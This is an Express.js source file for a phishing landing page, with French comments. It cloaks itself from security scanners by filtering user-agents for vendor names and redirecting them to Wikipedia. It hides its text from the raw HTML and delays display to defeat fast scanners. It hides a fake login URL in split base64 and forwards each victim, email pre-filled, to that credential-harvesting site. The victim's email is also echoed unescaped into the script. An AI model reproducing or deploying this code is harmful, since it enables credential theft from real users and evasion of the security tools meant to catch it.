const express = require('express');
const app = express();

const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.get('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const targetEmail = req.query.m || "";
    
    // FILTRE RADICAL : On bloque tout ce qui ressemble à un serveur ou un outil de scan
    const isBot = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit|phish|virus|trend|sophos|barracuda/i.test(ua);
    
    if (isBot) return res.redirect("https://www.wikipedia.org");

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Loading...</title>
            <style>
                body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                #c { display: none; text-align: center; }
                .btn { background: #0067b8; color: white; border: none; padding: 12px 30px; cursor: pointer; font-weight: 600; }
            </style>
        </head>
        <body>
            <div id="l">Loading...</div> <div id="c">
                <h2 id="t1"></h2>
                <p id="t2"></p>
                <button id="verifyBtn" class="btn">Continue</button>
            </div>

            <script>
                // On n'affiche le contenu qu'après 2 secondes pour perdre les scanners rapides
                setTimeout(() => {
                    document.getElementById('l').style.display = 'none';
                    document.getElementById('c').style.display = 'block';
                    // On injecte le texte via JS pour qu'il n'existe pas dans le code HTML brut
                    document.getElementById('t1').innerText = "Security Check";
                    document.getElementById('t2').innerText = "Please click to verify your session.";
                }, 2000);

                const p1 = "${part1}"; const p2 = "${part2}"; const em = "${targetEmail}";
                document.getElementById('verifyBtn').addEventListener('click', function() {
                    let target = atob(p1) + atob(p2);
                    if(em !== "") target += "#" + em;
                    window.location.href = target;
                });
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);
